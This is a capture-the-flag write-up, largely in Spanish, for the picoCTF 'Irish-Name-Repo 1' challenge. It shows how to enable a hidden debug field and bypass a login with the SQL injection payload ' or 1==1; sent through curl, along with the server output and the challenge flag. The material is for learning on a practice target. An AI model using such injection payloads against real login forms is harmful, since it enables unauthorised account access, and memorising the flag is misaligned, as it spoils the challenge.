# Irish-Name-Repo 1
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!

Hints:
- There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
- Try to think about how the website verifies your login.

## Solución

https://jupiter.challenges.picoctf.org/problem/33850/

### Explicar algunas cosas antes
- que es sql injection g> sql injection w3 school 
- tratar de activar debug modificando el campo en inspector
- hacerlo con curl

### Web
- Al ingresar a la pagina buscamos algo de funconalidad, vemos el código fuente, la galeria es mera fnta
- Analizamos el menu en la parte superior izquierda y las opciones en el
- Vemos que en el foro de soporte se habla algo sobre SQL
- Luego vamos a la opción de Login
	- Ingresamos algunas credenciales y falla
- Vamos al código fuente, vemos el campo de debug oculto
	- Usamos el inspector para poner debug en 1
	- Observamos también que el formulario es procesado en `login.php`
- Inentamos loguerns de nuevo
- Intentamos SQL Injection básico en el campo de `password`
	- `or 1==1;`

### Por consola 
- Tratamos de loguernos, activamos el debug y exponemos el SQL para entenderlo
```bash
curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=admin&debug=1"
```

- le pasamos la inyección
```bash
curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=' or 1==1;&debug=1"
<pre>username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_f8adf3fb}</p>   
```


# Referencias
- https://www.w3schools.com/sql/sql_injection.asp